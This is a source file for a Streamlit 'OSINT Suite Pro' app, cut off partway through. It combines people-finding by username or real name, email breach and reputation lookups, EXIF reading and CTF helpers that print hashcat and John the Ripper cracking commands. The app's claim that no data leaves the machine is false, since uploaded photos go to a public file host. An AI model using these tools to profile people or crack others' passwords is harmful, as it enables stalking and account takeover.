import sys, os, io, json, re, time, hashlib, urllib.parse, base64, socket, types, math
from datetime import datetime
import requests
import streamlit as st
from PIL import Image, ExifTags
import dns.resolver
from collections import Counter

# Python 3.13 patch
if "pkg_resources" not in sys.modules:
    _mock = types.ModuleType("pkg_resources")
    _mock.resource_filename = lambda p, r: os.path.join("/tmp", r)
    sys.modules["pkg_resources"] = _mock

# Optional magic for file type detection
try:
    import magic
    HAS_MAGIC = True
except ImportError:
    HAS_MAGIC = False

st.set_page_config(page_title="OSINT Suite Pro", page_icon="🕵️", layout="wide")

# ========== LIQUID GLASS + iOS ANIMATION CSS ==========
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;600;700&family=Share+Tech+Mono&display=swap');

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

.stApp {
    background:
        radial-gradient(ellipse 80% 60% at 20% 10%, rgba(0,100,255,0.18) 0%, transparent 60%),
        radial-gradient(ellipse 60% 50% at 80% 80%, rgba(0,220,255,0.12) 0%, transparent 55%),
        radial-gradient(ellipse 100% 100% at 50% 50%, #04080f 0%, #01030a 100%);
    min-height: 100vh;
}

/* Animated ambient orbs behind everything */
.stApp::before {
    content:'';
    position:fixed; top:-20%; left:-10%;
    width:500px; height:500px;
    background: radial-gradient(circle, rgba(0,120,255,0.12), transparent 70%);
    border-radius:50%;
    animation: floatOrb 12s ease-in-out infinite;
    pointer-events:none; z-index:0;
}
.stApp::after {
    content:'';
    position:fixed; bottom:-10%; right:-5%;
    width:400px; height:400px;
    background: radial-gradient(circle, rgba(0,230,255,0.10), transparent 70%);
    border-radius:50%;
    animation: floatOrb 16s ease-in-out infinite reverse;
    pointer-events:none; z-index:0;
}

@keyframes floatOrb {
    0%,100% { transform: translate(0,0) scale(1); }
    33% { transform: translate(40px,-30px) scale(1.1); }
    66% { transform: translate(-20px,20px) scale(0.95); }
}

/* iOS liquid glass card */
.glass-card {
    background: linear-gradient(135deg,
        rgba(255,255,255,0.07) 0%,
        rgba(255,255,255,0.03) 50%,
        rgba(0,180,255,0.05) 100%);
    backdrop-filter: blur(28px) saturate(180%);
    -webkit-backdrop-filter: blur(28px) saturate(180%);
    border-radius: 24px;
    border: 1px solid rgba(255,255,255,0.12);
    box-shadow:
        0 8px 32px rgba(0,0,0,0.4),
        inset 0 1px 0 rgba(255,255,255,0.15),
        inset 0 -1px 0 rgba(0,0,0,0.2);
    padding: 1.4rem 1.6rem;
    margin: 0.8rem 0;
    transition: transform 0.3s cubic-bezier(0.34,1.56,0.64,1),
                box-shadow 0.3s ease,
                border-color 0.3s ease;
    position: relative; overflow: hidden;
}
.glass-card::before {
    content:'';
    position:absolute; top:0; left:-60%;
    width:40%; height:100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.06), transparent);
    transform: skewX(-15deg);
    transition: left 0.6s ease;
}
.glass-card:hover::before { left:120%; }
.glass-card:hover {
    border-color: rgba(0,200,255,0.35);
    box-shadow: 0 16px 48px rgba(0,0,0,0.5), 0 0 40px rgba(0,180,255,0.12),
                inset 0 1px 0 rgba(255,255,255,0.2);
    transform: translateY(-3px) scale(1.005);
}

/* Buttons */
.stButton > button {
    background: linear-gradient(135deg, rgba(0,160,255,0.9), rgba(0,80,220,0.9));
    backdrop-filter: blur(12px);
    border: 1px solid rgba(255,255,255,0.2) !important;
    border-radius: 50px !important;
    padding: 0.55rem 1.4rem !important;
    font-weight: 600 !important;
    color: white !important;
    font-family: 'Share Tech Mono', monospace !important;
    letter-spacing: 0.03em;
    box-shadow: 0 4px 15px rgba(0,100,255,0.3), inset 0 1px 0 rgba(255,255,255,0.25);
    transition: all 0.25s cubic-bezier(0.34,1.56,0.64,1) !important;
}
.stButton > button:hover {
    transform: translateY(-2px) scale(1.03) !important;
    box-shadow: 0 8px 25px rgba(0,120,255,0.45), inset 0 1px 0 rgba(255,255,255,0.3) !important;
}
.stButton > button:active { transform: scale(0.97) !important; }

/* Tabs — liquid glass pill nav */
.stTabs [data-baseweb="tab-list"] {
    background: linear-gradient(135deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
    backdrop-filter: blur(30px) saturate(200%);
    -webkit-backdrop-filter: blur(30px) saturate(200%);
    border-radius: 60px;
    padding: 5px 6px;
    gap: 4px;
    border: 1px solid rgba(255,255,255,0.12);
    box-shadow: 0 4px 24px rgba(0,0,0,0.35),
                inset 0 1px 0 rgba(255,255,255,0.15),
                inset 0 -1px 0 rgba(0,0,0,0.15);
}
.stTabs [data-baseweb="tab"] {
    font-family: 'Share Tech Mono', monospace !important;
    font-size: 0.78rem !important;
    color: rgba(180,210,240,0.75) !important;
    padding: 0.45rem 1.2rem !important;
    border-radius: 50px !important;
    transition: all 0.3s cubic-bezier(0.34,1.56,0.64,1) !important;
}
.stTabs [data-baseweb="tab"]:hover { color: #fff !important; }
.stTabs [aria-selected="true"] {
    background: linear-gradient(135deg, rgba(0,160,255,0.85), rgba(0,70,210,0.85)) !important;
    color: white !important;
    box-shadow: 0 2px 16px rgba(0,140,255,0.45),
                inset 0 1px 0 rgba(255,255,255,0.3) !important;
    transform: scale(1.04);
}

/* Inputs */
.stTextInput > div > div > input,
.stTextArea > div > div > textarea {
    background: rgba(255,255,255,0.04) !important;
    backdrop-filter: blur(16px) !important;
    border: 1px solid rgba(255,255,255,0.12) !important;
    border-radius: 50px !important;
    color: #e8f4ff !important;
    font-family: 'Share Tech Mono', monospace !important;
    padding: 0.65rem 1.2rem !important;
    transition: all 0.3s ease !important;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.3) !important;
}
.stTextInput > div > div > input:focus,
.stTextArea > div > div > textarea:focus {
    border-color: rgba(0,180,255,0.5) !important;
    box-shadow: 0 0 0 3px rgba(0,160,255,0.15), inset 0 1px 3px rgba(0,0,0,0.3) !important;
}

/* Result cards */
.result-card {
    background: linear-gradient(135deg, rgba(0,180,255,0.07), rgba(0,80,200,0.04));
    border-left: 2px solid rgba(0,200,255,0.5);
    border-radius: 14px;
    padding: 0.75rem 1rem;
    margin: 0.4rem 0;
    backdrop-filter: blur(8px);
    border-top: 1px solid rgba(255,255,255,0.07);
    transition: background 0.2s, transform 0.2s;
}
.result-card:hover { background: rgba(0,180,255,0.12); transform: translateX(4px); }

h1,h2,h3 { font-family: 'Share Tech Mono', monospace; color: #e0f4ff; }
code {
    background: rgba(0,180,255,0.1);
    border: 1px solid rgba(0,180,255,0.2);
    border-radius: 8px; padding: 0.15rem 0.5rem;
    color: #00e5ff; font-family: 'Share Tech Mono', monospace; font-size: 0.85em;
}
hr { border-color: rgba(255,255,255,0.06); margin: 1rem 0; }

/* Fade-in animation for content */
@keyframes fadeSlideUp {
    from { opacity:0; transform: translateY(18px); }
    to   { opacity:1; transform: translateY(0); }
}
.glass-card, .result-card { animation: fadeSlideUp 0.45s cubic-bezier(0.22,1,0.36,1) both; }

/* Sidebar */
section[data-testid="stSidebar"] > div {
    background: linear-gradient(180deg, rgba(5,12,22,0.95), rgba(2,6,14,0.98)) !important;
    backdrop-filter: blur(30px) !important;
    border-right: 1px solid rgba(255,255,255,0.07) !important;
}

/* Status bar dot pulse */
@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
.live-dot {
    display:inline-block; width:8px; height:8px;
    background:#00e676; border-radius:50%;
    animation: pulse 2s ease infinite;
    margin-right:6px; vertical-align:middle;
}
</style>
""", unsafe_allow_html=True)

# ========== SVG LOGO + HEADER ==========
st.markdown("""
<div style="display:flex; flex-direction:column; align-items:center; padding: 2rem 0 0.5rem; gap:0.6rem;">

  <!-- Liquid glass orb logo -->
  <div style="
    width:96px; height:96px; border-radius:50%;
    background: linear-gradient(135deg, rgba(0,160,255,0.25), rgba(0,40,120,0.35));
    backdrop-filter: blur(20px) saturate(180%);
    border: 1.5px solid rgba(255,255,255,0.25);
    box-shadow: 0 8px 40px rgba(0,120,255,0.4),
                0 0 80px rgba(0,200,255,0.15),
                inset 0 2px 0 rgba(255,255,255,0.35),
                inset 0 -2px 0 rgba(0,0,0,0.2);
    display:flex; align-items:center; justify-content:center;
    position:relative; overflow:hidden;
    animation: floatOrb 6s ease-in-out infinite;
  ">
    <!-- highlight shimmer -->
    <div style="
      position:absolute; top:8px; left:14px;
      width:30px; height:12px;
      background: rgba(255,255,255,0.35);
      border-radius:50%; filter:blur(4px);
      transform: rotate(-25deg);
    "></div>
    <!-- Detective with magnifying glass SVG -->
    <svg width="52" height="52" viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
      <!-- Hat brim -->
      <rect x="12" y="20" width="24" height="4" rx="2" fill="rgba(255,255,255,0.95)"/>
      <!-- Hat top -->
      <rect x="16" y="9" width="16" height="13" rx="3" fill="rgba(255,255,255,0.95)"/>
      <!-- Hat band -->
      <rect x="16" y="18" width="16" height="3" rx="1" fill="rgba(0,180,255,0.8)"/>
      <!-- Head -->
      <ellipse cx="24" cy="30" rx="8" ry="7" fill="rgba(255,220,170,0.9)"/>
      <!-- Body / coat -->
      <path d="M14 44 Q14 36 24 35 Q34 36 34 44 Z" fill="rgba(255,255,255,0.85)"/>
      <!-- Magnifying glass handle -->
      <line x1="34" y1="36" x2="42" y2="44" stroke="rgba(255,255,255,0.9)" stroke-width="3" stroke-linecap="round"/>
      <!-- Magnifying glass circle -->
      <circle cx="31" cy="33" r="7" stroke="rgba(0,220,255,1)" stroke-width="2.5" fill="rgba(0,180,255,0.15)"/>
      <!-- Lens glint -->
      <circle cx="28.5" cy="30.5" r="1.5" fill="rgba(255,255,255,0.6)"/>
    </svg>
  </div>

  <!-- Wordmark -->
  <div style="text-align:center;">
    <div style="
      font-family:'Share Tech Mono',monospace;
      font-size:2.4rem; font-weight:700; letter-spacing:0.08em;
      background: linear-gradient(135deg, #ffffff 20%, #00d4ff 60%, #0080ff 100%);
      -webkit-background-clip:text; -webkit-text-fill-color:transparent;
      line-height:1;
    ">OSINT SUITE</div>
    <div style="
      font-family:'Share Tech Mono',monospace;
      font-size:0.7rem; letter-spacing:0.35em; color:rgba(0,200,255,0.7);
      margin-top:4px; text-transform:uppercase;
    ">PRO · INTELLIGENCE PLATFORM</div>
  </div>

  <!-- Pill badges -->
  <div style="display:flex; gap:8px; flex-wrap:wrap; justify-content:center; margin-top:4px;">
    <span style="background:rgba(0,200,255,0.1);border:1px solid rgba(0,200,255,0.25);border-radius:50px;padding:3px 12px;font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:#00d4ff;letter-spacing:0.1em;"><span class='live-dot'></span>LIVE</span>
    <span style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:50px;padding:3px 12px;font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:rgba(180,210,240,0.7);letter-spacing:0.08em;">REAL DATA</span>
    <span style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:50px;padding:3px 12px;font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:rgba(180,210,240,0.7);letter-spacing:0.08em;">v2.0 · 2026</span>
  </div>
</div>
""", unsafe_allow_html=True)

with st.sidebar:
    st.markdown("""
    <div style='padding:0.5rem 0 1rem;'>
      <div style='font-family:"Share Tech Mono",monospace;font-size:0.65rem;letter-spacing:0.3em;color:rgba(0,200,255,0.5);margin-bottom:1rem;text-transform:uppercase;'>Navigation</div>
      <div style='display:flex;flex-direction:column;gap:6px;'>
    """ + "".join([
        f"<div style='padding:8px 14px;border-radius:12px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.07);font-family:\"Share Tech Mono\",monospace;font-size:0.78rem;color:rgba(200,225,255,0.8);'>{icon}</div>"
        for icon in ["🔍 Reverse Image","👤 Username Hunt","📧 Email OSINT","📁 Metadata","🎯 CTF Solver","🔬 Deep File Scan","🌐 Network Recon","🔑 Password Intel"]
    ]) + """
      </div>
    </div>
    <hr style='border-color:rgba(255,255,255,0.06);margin:1rem 0;'/>
    """, unsafe_allow_html=True)
    st.markdown("""
    <div style='font-family:"Share Tech Mono",monospace;font-size:0.65rem;color:rgba(120,160,200,0.5);line-height:1.8;'>
    <span style='color:rgba(0,230,100,0.8);'>●</span> All data is live &amp; real<br>
    <span style='color:rgba(0,200,255,0.6);'>◆</span> Open-source intelligence<br>
    <span style='color:rgba(180,180,255,0.5);'>▸</span> v2.0 · June 2026
    </div>
    """, unsafe_allow_html=True)

tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs([
    "🔍 Reverse Image", "👤 Username Hunt", "📧 Email OSINT",
    "📁 Metadata", "🎯 CTF Solver", "🔬 Deep File Scan", "🌐 Network Recon", "🔑 Password Intel"
])

# ========== TAB 1: Reverse Image ==========
with tab1:
    st.markdown("### 🔍 Reverse Image Search")
    img_file = st.file_uploader("Upload photo", type=["jpg","png","jpeg","webp"], key="rev")
    if img_file:
        img_bytes = img_file.getvalue()
        col1, col2 = st.columns([1,1.5])
        with col1:
            st.image(img_bytes, width=200)
        with col2:
            st.markdown(f"**File:** {img_file.name}  \n**Size:** {len(img_bytes)//1024} KB")
        with st.spinner("Uploading to relay..."):
            try:
                r = requests.post("https://tmpfiles.org/api/v1/upload", files={'file': (img_file.name, img_bytes)}, timeout=15)
                if r.status_code == 200:
                    raw = r.json()['data']['url']
                    direct = raw.replace("tmpfiles.org/", "tmpfiles.org/dl/")
                    enc = urllib.parse.quote_plus(direct)
                    st.success("✅ Ready")
                    engines = {
                        "🔍 Google Lens": f"https://lens.google.com/uploadbyurl?url={enc}",
                        "🇷🇺 Yandex": f"https://yandex.com/images/search?rpt=imageview&url={enc}",
                        "🌐 Bing Visual": f"https://www.bing.com/images/search?view=detailv2&iss=sbi&q=imgurl:{enc}",
                        "🕵️ TinEye": f"https://tineye.com/search?url={enc}"
                    }
                    cols = st.columns(2)
                    for i,(name,url) in enumerate(engines.items()):
                        with cols[i%2]:
                            st.link_button(name, url, use_container_width=True)
                else:
                    st.error("Upload failed")
            except Exception as e:
                st.error(f"Error: {e}")

# ========== TAB 2: Username Hunt (TikTok fixed) ==========
with tab2:
    st.markdown("### 👤 Username Hunt")
    st.markdown("Enter a **username** or **real name** – we'll find social profiles (including TikTok).")
    query = st.text_input("Name or username", placeholder="username or John Doe", key="username_input")
    mode = st.radio("Mode", ["Username → Socials", "Name → Socials"], horizontal=True)
    if st.button("🔍 Hunt", use_container_width=True) and query:
        candidates = set()
        q = query.strip().lower()
        if mode == "Username → Socials":
            candidates.add(q)
        else:
            parts = q.split()
            if len(parts) >= 1:
                first = parts[0]
                last = parts[-1] if len(parts) > 1 else ""
                candidates.add(q.replace(" ", ""))
                candidates.add(q.replace(" ", "."))
                candidates.add(q.replace(" ", "_"))
                if last:
                    candidates.add(f"{first}{last}")
                    candidates.add(f"{first}.{last}")
                    candidates.add(f"{first}_{last}")
                    candidates.add(f"{first}{last[:2]}")
                    candidates.add(f"{first[0]}{last}")
                    candidates.add(f"{last}{first}")
                    candidates.add(f"{first}{last}1")
        candidates = list(candidates)[:15]
        
        platforms = {
            "📸 Instagram": "https://instagram.com/{}",
            "🎵 TikTok": "https://tiktok.com/@{}",
            "🐦 Twitter": "https://twitter.com/{}",
            "📘 Facebook": "https://facebook.com/{}",
            "💻 GitHub": "https://github.com/{}",
            "🤖 Reddit": "https://reddit.com/user/{}",
            "🎬 YouTube": "https://youtube.com/@{}",
            "📺 Twitch": "https://twitch.tv/{}",
            "👻 Snapchat": "https://snapchat.com/add/{}",
            "📱 Telegram": "https://t.me/{}",
            "📌 Pinterest": "https://pinterest.com/{}",
            "💼 LinkedIn": "https://linkedin.com/in/{}"
        }
        
        results = []
        progress = st.progress(0)
        status = st.empty()
        total = len(candidates) * len(platforms)
        done = 0
        for username in candidates:
            status.markdown(f"<code>▶ Trying @{username}</code>", unsafe_allow_html=True)
            for plat, url_tmpl in platforms.items():
                url = url_tmpl.format(username)
                try:
                    resp = requests.get(url, timeout=4, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True)
                    if resp.status_code == 200:
                        body = resp.text.lower()
                        # TikTok specific and general not-found phrases
                        not_found_phrases = [
                            "not found", "doesn't exist", "page not found", "user not found",
                            "couldn't find this account", "sorry, this page isn't available",
                            "no user found", "this account doesn't exist"
                        ]
                        if not any(phrase in body for phrase in not_found_phrases):
                            results.append({"platform": plat, "username": username, "url": url})
                except:
                    pass
                done += 1
                progress.progress(min(done/total, 0.99))
        status.empty()
        progress.empty()
        
        if results:
            st.success(f"✅ Found {len(results)} matches")
            for r in results:
                st.markdown(f"""
                <div class='result-card'>
                    <b>{r['platform']}</b> → @{r['username']}<br>
                    <a href='{r['url']}' target='_blank'>{r['url']}</a>
                </div>
                """, unsafe_allow_html=True)
        else:
            st.warning("No profiles found. Try different spelling or mode.")

# ========== TAB 3: Email OSINT ==========
with tab3:
    st.markdown("### 📧 Email OSINT (Real Data)")
    email = st.text_input("Email address", placeholder="target@example.com")
    if st.button("Analyze", use_container_width=True) and email:
        if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
            st.error("Invalid email")
        else:
            local, domain = email.split("@")
            md5 = hashlib.md5(email.encode()).hexdigest()
            st.markdown(f"""
            <div class='glass-card'>
                <b>📧 Email:</b> {email}<br>
                <b>👤 Local:</b> {local}<br>
                <b>🌐 Domain:</b> {domain}<br>
                <b>🔐 MD5:</b> <code>{md5}</code>
            </div>
            """, unsafe_allow_html=True)
            
            # Gravatar
            grav_url = f"https://www.gravatar.com/avatar/{md5}?d=404"
            try:
                g = requests.get(grav_url, timeout=5)
                if g.status_code == 200:
                    st.success("✅ Gravatar profile exists")
                    st.image(f"https://www.gravatar.com/avatar/{md5}?s=100", width=100)
                else:
                    st.info("No Gravatar")
            except:
                pass
            
            # HIBP
            st.markdown("#### 🔓 Breach Check (HIBP)")
            with st.spinner("Querying HaveIBeenPwned..."):
                try:
                    hibp_url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{urllib.parse.quote(email)}"
                    r = requests.get(hibp_url, headers={"hibp-api-key": ""}, timeout=10)
                    if r.status_code == 200:
                        breaches = r.json()
                        st.error(f"⚠️ Found in {len(breaches)} breaches")
                        for b in breaches[:5]:
                            st.write(f"- **{b['Name']}** ({b.get('BreachDate','?')})")
                    elif r.status_code == 404:
                        st.success("✅ No breaches found")
                    else:
                        st.link_button("Check manually", f"https://haveibeenpwned.com/account/{urllib.parse.quote(email)}")
                except:
                    st.link_button("Manual check", f"https://haveibeenpwned.com/account/{urllib.parse.quote(email)}")
            
            # EmailRep
            st.markdown("#### 📊 Email Reputation (EmailRep)")
            try:
                erep = requests.get(f"https://emailrep.io/{urllib.parse.quote(email)}", timeout=8)
                if erep.status_code == 200:
                    data = erep.json()
                    st.write(f"**Reputation:** {data.get('reputation', 'unknown')}")
                    st.write(f"**Suspicious:** {data.get('suspicious', False)}")
                    st.write(f"**Domain age:** {data.get('details',{}).get('domain_created', '?')}")
                else:
                    st.info("EmailRep rate limited")
            except:
                pass

# ========== TAB 4: Metadata (fixed PIL error) ==========
with tab4:
    st.markdown("### 📁 Metadata & EXIF")
    meta_file = st.file_uploader("Upload image", type=["jpg","jpeg","png","tiff"], key="meta")
    if meta_file:
        try:
            img = Image.open(io.BytesIO(meta_file.getvalue()))
            st.image(img, width=250)
            st.markdown(f"**Format:** {img.format}  \n**Size:** {img.size[0]}x{img.size[1]}")
            exif = img._getexif()
            if exif:
                gps = any("GPS" in ExifTags.TAGS.get(k,'') for k in exif)
                if gps:
                    st.warning("⚠️ GPS coordinates present")
                st.json({ExifTags.TAGS.get(k,k): str(v)[:200] for k,v in exif.items()})
            else:
                st.info("No EXIF data")
        except Exception as e:
            st.error(f"Could not read image: {e}")

# ========== TAB 5: CTF Solver – Deep Interactive ==========
with tab5:
    st.markdown("### 🎯 CTF Solver — Interactive Toolkit")
    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>All decoders run in-browser. No data leaves your machine.</p>", unsafe_allow_html=True)

    ctf_tab = st.selectbox("Select tool", [
        "🔤 Multi-Decoder",
        "🔄 ROT Brute-Force (all 25)",
        "#️⃣ Hash Identifier & Cracker",
        "🔢 Number Base Converter",
        "🔡 Caesar / Vigenère Cipher",
        "🗜️ Encoding Chain",
        "🖼️ Steganography Guide",
        "💉 Web Exploitation Payloads",
        "🔬 Forensics & Volatility",
        "⚙️ Reverse Engineering",
    ], key="ctf_tool")

    # ── Multi-Decoder ──────────────────────────────────────────
    if ctf_tab == "🔤 Multi-Decoder":
        st.markdown("Paste anything — the tool tries every common encoding automatically.")
        raw = st.text_area("Input", height=100, placeholder="dGhpcyBpcyBhIHRlc3Q=  or  68656c6c6f  or  Uryyb")
        if raw and raw.strip():
            r = raw.strip()
            results = {}

            # Base64
            try: results["Base64"] = base64.b64decode(r + "==").decode("utf-8")
            except: pass
            # Base64 URL-safe
            try: results["Base64 URL-safe"] = base64.urlsafe_b64decode(r + "==").decode("utf-8")
            except: pass
            # Hex
            try:
                clean = r.replace(" ","").replace(":","")
                results["Hex"] = bytes.fromhex(clean).decode("utf-8")
            except: pass
            # ROT13
            results["ROT13"] = r.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
            # URL decode
            try: results["URL Decode"] = urllib.parse.unquote(r)
            except: pass
            # Binary
            try:
                bits = r.replace(" ","")
                if re.fullmatch(r'[01]+', bits) and len(bits) % 8 == 0:
                    results["Binary"] = "".join(chr(int(bits[i:i+8],2)) for i in range(0,len(bits),8))
            except: pass
            # Morse
            MORSE = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I',
                     '.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q',
                     '.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y','--..' :'Z',
                     '-----':'0','.----':'1','..---':'2','...--':'3','....-':'4','.....' :'5','-....':'6',
                     '--...':'7','---..':'8','----.':'9'}
            try:
                words = r.strip().split(" / ")
                decoded = " ".join("".join(MORSE.get(c,"?") for c in w.split()) for w in words)
                if "?" not in decoded:
                    results["Morse Code"] = decoded
            except: pass
            # Atbash
            results["Atbash"] = r.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba'))

            for name, val in results.items():
                if val and val.strip() and val != r:
                    st.markdown(f"<div class='result-card'><code>{name}</code><br><span style='color:#e0f4ff;'>{val[:300]}</span></div>", unsafe_allow_html=True)

    # ── ROT Brute-Force ────────────────────────────────────────
    elif ctf_tab == "🔄 ROT Brute-Force (all 25)":
        text = st.text_area("Ciphertext", height=80, placeholder="Gur dhvpx oebja sbk")
        if text:
            for n in range(1, 26):
                rotated = text.translate(str.maketrans(
                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                    ('ABCDEFGHIJKLMNOPQRSTUVWXYZ'[n:] + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[:n]) +
                    ('abcdefghijklmnopqrstuvwxyz'[n:] + 'abcdefghijklmnopqrstuvwxyz'[:n])
                ))
                st.markdown(f"<div class='result-card'><code>ROT{n:02d}</code> {rotated[:200]}</div>", unsafe_allow_html=True)

    # ── Hash Identifier ────────────────────────────────────────
    elif ctf_tab == "#️⃣ Hash Identifier & Cracker":
        h_in = st.text_input("Paste hash", placeholder="5f4dcc3b5aa765d61d8327deb882cf99")
        if h_in:
            h = h_in.strip()
            L = len(h)
            HASH_MAP = {
                (32, r'[a-fA-F0-9]{32}'): ("MD5", 0, "md5"),
                (32, r'[a-zA-Z0-9./]{13}'): ("DES Crypt", None, None),
                (40, r'[a-fA-F0-9]{40}'): ("SHA-1", 100, "sha1"),
                (56, r'[a-fA-F0-9]{56}'): ("SHA-224", 1300, None),
                (64, r'[a-fA-F0-9]{64}'): ("SHA-256", 1400, "sha256"),
                (96, r'[a-fA-F0-9]{96}'): ("SHA-384", 10800, None),
                (128, r'[a-fA-F0-9]{128}'): ("SHA-512", 1700, "sha512"),
                (32, r'\$1\$.+'): ("MD5 Crypt", 500, None),
                (60, r'\$2[aby]\$.+'): ("bcrypt", 3200, None),
            }
            detected = None
            for (length, pattern), (name, hc_mode, jf) in HASH_MAP.items():
                if L == length and re.fullmatch(pattern, h):
                    detected = (name, hc_mode, jf); break
            if not detected and re.fullmatch(r'[a-fA-F0-9]+', h):
                detected = (f"Unknown hex ({L} chars)", None, None)

            if detected:
                name, hc_mode, jf = detected
                st.success(f"✅ Detected: **{name}**")
                col1, col2 = st.columns(2)
                with col1:
                    st.link_button("🔍 CrackStation", f"https://crackstation.net/", use_container_width=True)
                with col2:
                    st.link_button("🔍 Hashes.com", f"https://hashes.com/en/decrypt/hash", use_container_width=True)
                st.markdown("**Local cracking commands:**")
                if hc_mode is not None:
                    st.code(f"hashcat -m {hc_mode} -a 0 '{h}' /usr/share/wordlists/rockyou.txt")
                if jf:
                    st.code(f"echo '{h}' > hash.txt\njohn --format=raw-{jf} --wordlist=/usr/share/wordlists/rockyou.txt hash.txt")
                st.markdown("**Online rainbow tables** → [hashes.com](https://hashes.com/en/decrypt/hash) · [md5decrypt.net](https://md5decrypt.net)")
            else:
                st.warning("Could not identify hash type.")

    # ── Number Base Converter ──────────────────────────────────
    elif ctf_tab == "🔢 Number Base Converter":
        num_in = st.text_input("Number or text", placeholder="48656c6c6f or 01001000 or 72")
        base_from = st.radio("Interpret as", ["Hex","Binary","Decimal","Octal","ASCII text"], horizontal=True)
        if num_in and num_in.strip():
            v = num_in.strip().replace(" ","")
            try:
                if base_from == "Hex":      n = int(v, 16)
                elif base_from == "Binary": n = int(v, 2)
                elif base_from == "Decimal":n = int(v, 10)
                elif base_from == "Octal":  n = int(v, 8)
                else:                       n = int.from_bytes(v.encode(), 'big')

                cols = st.columns(4)
                cols[0].metric("Decimal", str(n))
                cols[1].metric("Hex", hex(n))
                cols[2].metric("Binary", bin(n))
                cols[3].metric("Octal", oct(n))
                try:
                    blen = (n.bit_length() + 7) // 8
                    st.markdown(f"<div class='result-card'><code>ASCII</code> {n.to_bytes(blen,'big').decode('utf-8','replace')}</div>", unsafe_allow_html=True)
                except: pass
            except Exception as e:
                st.error(f"Conversion error: {e}")

    # ── Caesar / Vigenère ─────────────────────────────────────
    elif ctf_tab == "🔡 Caesar / Vigenère Cipher":
        mode = st.radio("Cipher", ["Caesar","Vigenère"], horizontal=True)
        ct = st.text_area("Ciphertext", height=80)
        if mode == "Caesar":
            shift = st.slider("Shift", 1, 25, 13)
            if ct:
                out = ct.translate(str.maketrans(
                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                    ('ABCDEFGHIJKLMNOPQRSTUVWXYZ'[shift:] + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[:shift]) +
                    ('abcdefghijklmnopqrstuvwxyz'[shift:] + 'abcdefghijklmnopqrstuvwxyz'[:shift])
                ))
                st.markdown(f"<div class='result-card'><b>Decoded (shift {shift}):</b><br>{out}</div>", unsafe_allow_html=True)
        else:
            key = st.text_input("Key", placeholder="SECRET")
            if ct and key:
                key = key.upper()
                out, ki = [], 0
                for ch in ct:
                    if ch.isalpha():
                        k = ord(key[ki % len(key)]) - 65
                        base = 65 if ch.isupper() else 97
                        out.append(chr((ord(ch) - base - k) % 26 + base))
                        ki += 1
                    else:
                        out.append(ch)
                st.markdown(f"<div class='result-card'><b>Vigenère decoded:</b><br>{''.join(out)}</div>", unsafe_allow_html=True)

    # ── Encoding Chain ────────────────────────────────────────
    elif ctf_tab == "🗜️ Encoding Chain":
        st.markdown("Chain multiple encodings — decode in reverse order (deepest first).")
        chain_in = st.text_area("Input", height=80)
        ops = st.multiselect("Apply (in order, last = outermost layer):",
            ["Base64 Decode","Base64 Encode","URL Decode","URL Encode","Hex Decode","Hex Encode","ROT13","Reverse"],
            default=["Base64 Decode"])
        if chain_in and ops:
            val = chain_in.strip()
            for op in ops:
                try:
                    if op == "Base64 Decode": val = base64.b64decode(val + "==").decode()
                    elif op == "Base64 Encode": val = base64.b64encode(val.encode()).decode()
                    elif op == "URL Decode": val = urllib.parse.unquote(val)
                    elif op == "URL Encode": val = urllib.parse.quote(val)
                    elif op == "Hex Decode": val = bytes.fromhex(val.replace(" ","")).decode()
                    elif op == "Hex Encode": val = val.encode().hex()
                    elif op == "ROT13": val = val.translate(str.maketrans(
                        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
                    elif op == "Reverse": val = val[::-1]
                    st.markdown(f"<div class='result-card'><code>After {op}:</code><br>{val[:400]}</div>", unsafe_allow_html=True)
                except Exception as e:
                    st.error(f"Failed at **{op}**: {e}"); break

    # ── Steganography Guide ───────────────────────────────────
    elif ctf_tab == "🖼️ Steganography Guide":
        steg_f = st.file_uploader("Upload image (optional — for command generation)", type=["jpg","png","bmp","gif","tiff"], key="steg2")
        fname = steg_f.name if steg_f else "image.png"
        if steg_f:
            st.image(io.BytesIO(steg_f.getvalue()), width=220)

        st.markdown("#### Tool Checklist")
        tools = [
            ("1️⃣ Check file type", f"`file {fname}`", "Always start here — extension can lie."),
            ("2️⃣ Strings dump", f"`strings {fname} | grep -iE 'flag|key|pass|CTF'`", "Quick win for plaintext flags."),
